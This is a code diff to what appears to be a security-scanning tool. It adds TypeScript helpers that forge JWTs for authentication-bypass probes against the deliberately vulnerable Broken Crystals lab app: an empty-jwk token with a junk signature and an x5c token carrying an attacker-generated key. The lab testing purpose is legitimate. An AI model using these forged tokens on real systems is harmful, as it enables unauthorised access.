@@ -449,7 +449,7 @@ export function looksPublicBucketListing(body: string, provider: CloudStoragePro
   return false;
 }
 
-import { createHmac } from "node:crypto";
+import { createHmac, createSign, generateKeyPairSync } from "node:crypto";
 
 function b64urlJson(obj: Record<string, unknown>): string {
   const json = JSON.stringify(obj);
@@ -483,6 +483,41 @@ export function buildHs256Jwt(
     .replace(/\//g, "_")
     .replace(/=+$/, "");
   return `${data}.${sig}`;
+}
+
+function b64urlSig(buf: Buffer): string {
+  return buf
+    .toString("base64")
+    .replace(/\+/g, "-")
+    .replace(/\//g, "_")
+    .replace(/=+$/, "");
+}
+
+/** Build an RS256-signed JWT for lab auth-bypass probes. */
+export function buildRs256Jwt(
+  payload: Record<string, unknown>,
+  privateKeyPem: string,
+  headerExtra: Record<string, unknown> = {}
+): string {
+  const header = b64urlJson({ alg: "RS256", typ: "JWT", ...headerExtra });
+  const body = b64urlJson(payload);
+  const data = `${header}.${body}`;
+  const sig = b64urlSig(createSign("RSA-SHA256").update(data).sign(privateKeyPem));
+  return `${data}.${sig}`;
+}
+
+/** Broken Crystals JWK processor accepts tokens when header.jwk exists but kty is empty. */
+export function buildJwkEmptyBypassJwt(payload: Record<string, unknown>): string {
+  const header = b64urlJson({ alg: "RS256", typ: "JWT", jwk: {} });
+  const body = b64urlJson(payload);
+  return `${header}.${body}.x`;
+}
+
+/** Forge a JWT whose x5c header embeds the attacker's PKCS#8 PEM (Broken Crystals x5c oracle). */
+export function buildBrokencrystalsX5cRogueJwt(payload: Record<string, unknown>): string {
+  const { privateKey } = generateKeyPairSync("rsa", { modulusLength: 2048 });
+  const pkcs8 = privateKey.export({ type: "pkcs8", format: "pem" }).toString();
+  return buildRs256Jwt(payload, pkcs8, { x5c: [pkcs8] });
 }
 
 export function looksAuthChallenge(doc: { status: number; body: string }): boolean {
